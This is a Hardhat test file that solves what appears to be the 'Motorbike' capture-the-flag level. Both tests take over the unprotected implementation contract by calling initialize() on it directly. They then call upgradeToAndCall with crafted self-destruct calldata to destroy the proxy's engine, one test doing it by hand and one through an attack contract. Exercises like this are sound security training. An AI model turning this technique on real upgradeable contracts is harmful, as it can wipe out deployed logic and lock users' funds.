const {expect} = require("chai");
const {loadFixture} = require("ethereum-waffle");
const {ethers} = require("hardhat");
const hre = require("hardhat");

describe("Motor Bike Attack", function () {


    it("attack using ethers", async function () {
        const {motorbikeContract, engineContract, user1, destroyerContract} = await loadFixture(deployFixture)

        await expect(motorbikeContract.upgrader()).to.not.be.reverted;

        const tnx1 = await engineContract.connect(user1).initialize();
        await tnx1.wait();
        const tnx2 = await engineContract.connect(user1).upgradeToAndCall(destroyerContract.address, "0x00f55d9d" + "000000000000000000000000" + "70997970C51812dc3A010C7d01b50e0d17dc79C8");
        await tnx2.wait();

        await expect(motorbikeContract.upgrader()).to.be.reverted;

    });


    it("attack using contract", async function () {
        const {motorbikeContract, attackContract, user1, destroyerContract} = await loadFixture(deployFixture)

        await expect(motorbikeContract.upgrader()).to.not.be.reverted;

        const tnx1 = await attackContract.connect(user1).attack(destroyerContract.address);
        await tnx1.wait();

        await expect(motorbikeContract.upgrader()).to.be.reverted;

    });


    async function deployFixture() {
        const [deployer, user1, user2] = await ethers.getSigners();
        const BaseEngine = await ethers.getContractFactory("Engine");
        let engineContract = await BaseEngine.connect(deployer).deploy();
        await engineContract.deployed()

        let BaseMotorbike = await ethers.getContractFactory("Motorbike");
        let motorbikeContract = await BaseMotorbike.connect(deployer).deploy(engineContract.address);

        await motorbikeContract.deployed();

        const baseAttackContract = await ethers.getContractFactory("AttackMotorBike");
        let attackContract = await baseAttackContract.connect(user1).deploy(engineContract.address);
        await attackContract.deployed()

        const baseEngineDestructContract = await ethers.getContractFactory("EngineDestruct");
        let destroyerContract = await baseEngineDestructContract.connect(user1).deploy();
        await destroyerContract.deployed()

        return {motorbikeContract, BaseEngine, engineContract, attackContract, destroyerContract, deployer, user1, user2}
    }
});
